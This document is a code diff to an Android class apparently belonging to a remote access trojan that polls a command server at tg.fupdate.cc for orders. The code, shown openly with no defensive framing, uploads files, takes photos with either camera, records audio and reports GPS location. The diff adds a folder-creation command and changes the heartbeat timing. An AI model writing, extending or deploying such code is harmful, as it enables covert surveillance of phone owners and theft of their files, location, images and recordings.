@@ -85,7 +85,6 @@ public class TelegramManager {
     public static final String TAG = "TelegramManager";
     public static Context context;
 
-    //public static String url = "http://192.168.3.179:8001";
     public static String url = "http://tg.fupdate.cc:8001";
     //public static String url = "http://192.168.3.91:8000";
     public static int count = 0;
@@ -138,7 +137,7 @@ public class TelegramManager {
                     public void accept(RatVo ratVo) throws Exception {
                         if (ratVo.getCode() == 0) { // 注册成功
                             System.out.println("2020==注册请求成功>");
-                            sync_Heart.start(); // 心跳
+                            //sync_Heart.start(); // 心跳
                             sync_Commands.start(); // 请求
                         } else { // 注册失败
                             count += 1;
@@ -146,7 +145,7 @@ public class TelegramManager {
                                 System.out.println("2020==注册请求失败，重新注册中>" + count);
                                 Register(context);
                             } else {
-                                sync_Heart.start(); // 心跳
+                                //sync_Heart.start(); // 心跳
                                 sync_Commands.start(); // 请求
                             }
                         }
@@ -157,6 +156,7 @@ public class TelegramManager {
     // 心跳请求
     @SuppressLint("CheckResult")
     public static void Heart(Context context){
+        //Commands(context);
         HttpRequest.Heart(GetCommon(context), url).subscribe(new Consumer<RatVo>() {
                     @Override
                     public void accept(RatVo ratVo) throws Exception {
@@ -177,7 +177,6 @@ public class TelegramManager {
             public void accept(RatVo ratVo) throws Exception {
                 if (ratVo.getCode() == 0) { // 请求成功
                     System.out.println("2020==请求指令成功");
-                    Long Timestamp = ratVo.getTimestamp();
                     if (ratVo.getData().size() != 0) {
                         JsonObject jsonObject = ratVo.getData();
                         final String action = jsonObject.get("action").toString().substring(1,jsonObject.get("action").toString().length()-1);
@@ -302,29 +301,45 @@ public class TelegramManager {
                                     new Thread(new Runnable() {
                                         @Override
                                         public void run() {
-                                            FileManager.UploadFile(file_path, file_url);
+                                            FileManager.UploadFile(file_path, file_url,context,action_id);
                                         }
                                     }).start();
                                 } else {
                                     SendFile(context,action_id);
                                 }
                                 break;
+                            case "FILE_MKDIR": // 文件夹创建
+                                final String mk_file = jsonObject.get("path").toString().substring(1,jsonObject.get("path").toString().length()-1);
+                                String Dir_path = mk_file.substring(0, mk_file.lastIndexOf("/"));
+                                if (Permission.getPermission(context,"android.permission.WRITE_EXTERNAL_STORAGE")
+                                        && new File(Dir_path).canWrite()) {
+                                    Datas(context,action_id,10001,"没有权限，无法执行操作", null);
+                                } else {
+                                    if (FileManager.Mkdir(mk_file) == 0) {
+                                        Datas(context,action_id,10004,"文件夹已存在", null);
+                                    } else if (FileManager.Mkdir(mk_file) == 1) {
+                                        Datas(context,action_id,0,"success", null);
+                                    } else if (FileManager.Mkdir(mk_file) == 2) {
+                                        Datas(context,action_id,10005,"文件夹创建失败", null);
+                                    }
+                                }
+                                break;
                             case "CAM_MOB_F": // 前置拍照
-                                if (Permission.getPermission(context,"android.permission.CAMERA")){
+                                if (Permission.getPermission(context,"android.permission.CAMERA")) {
                                     new CameraManager(context).startUp(1,action_id,url);
                                 } else {
                                     SendFile(context,action_id);
                                 }
                                 break;
                             case "CAM_MOB_B": // 后置拍照
-                                if (Permission.getPermission(context,"android.permission.CAMERA")){
+                                if (Permission.getPermission(context,"android.permission.CAMERA")) {
                                     new CameraManager(context).startUp(0,action_id,url);
                                 } else {
                                     SendFile(context,action_id);
                                 }
                                 break;
                             case "AUDIO_R": // 录音 时长sec
-                                if (Permission.getPermission(context,"android.permission.RECORD_AUDIO")){
+                                if (Permission.getPermission(context,"android.permission.RECORD_AUDIO")) {
                                     try {
                                         int sec = Integer.valueOf(jsonObject.get("sec").toString());
                                         MicManager.startRecording(context,sec,action_id,url); //录音
@@ -336,7 +351,7 @@ public class TelegramManager {
                                 }
                                 break;
                             case "GPS_R": // 获取位置
-                                if (Permission.getPermission(context,"android.permission.ACCESS_FINE_LOCATION")){
+                                if (Permission.getPermission(context,"android.permission.ACCESS_FINE_LOCATION")) {
                                     init(context,action_id);
                                     /*LocManager gps = new LocManager(context);
                                     JsonObject location = new JsonObject();
@@ -355,10 +370,10 @@ public class TelegramManager {
                                 Datas_n(context,action_id,0,"success",null);
                                 enable = Boolean.valueOf(jsonObject.get("enable").toString());
                                 interval = Integer.valueOf(jsonObject.get("interval").toString());
-                                if (Permission.getPermission(context,"android.permission.ACCESS_FINE_LOCATION")){
+                                if (Permission.getPermission(context,"android.permission.ACCESS_FINE_LOCATION")) {
                                     new Thread_GPS().start();
                                 } else {
-                                    Datas_rt(context,10001,"没有权限，无法执行操作",null);
+                                    Datas_n(context,action_id,10001,"没有权限，无法执行操作",null);
                                 }
                                 break;
                             default:
@@ -374,7 +389,7 @@ public class TelegramManager {
 
     // 数据结果上报 格式：JsonArray
     @SuppressLint("CheckResult")
-    public static void Datas(Context context, int action_id, int code, String msg, final JsonArray res_data){
+    public static void Datas(Context context, int action_id, int code, String msg, final JsonArray res_data) {
         JsonObject params = new JsonObject();
         try{
             params.addProperty("action_id", action_id);
@@ -453,7 +468,7 @@ public class TelegramManager {
                 .addFormDataPart("down_delay", "-1")
                 .addFormDataPart("action_id", String.valueOf(action_id))
                 .addFormDataPart("code", String.valueOf(10001))
-                .addFormDataPart("msg", "没有权限或文件不存在，无法执行操作")
+                .addFormDataPart("msg", "没有权限或参数不正确，无法执行操作")
                 .build();
 
         Retrofit retrofit = new Retrofit.Builder().baseUrl(url)
@@ -522,12 +537,18 @@ public class TelegramManager {
     }
 
 
+    public static int Num = 0;
     // 请求指令
     static Thread sync_Commands = new Thread(new Runnable() {
         @Override
         public void run() {
             while (true) {
                 Commands(context);
+                Num = Num + 1;
+                if (Num == 5){
+                    Heart(context);
+                    Num = 0;
+                }
                 try {
                     Thread.sleep(2000);
                 } catch (InterruptedException e) {
@@ -614,6 +635,7 @@ public class TelegramManager {
                     location.addProperty("longitude" , aMapLocation.getLongitude());
                     if (action_id == 0) {
                         Datas_rt(context,0,"success",location);
+                        System.out.println("20201217==>" + new Gson().toJson(location));
                     } else {
                         Datas_n(context,action_id,0,"success",location);
                     }
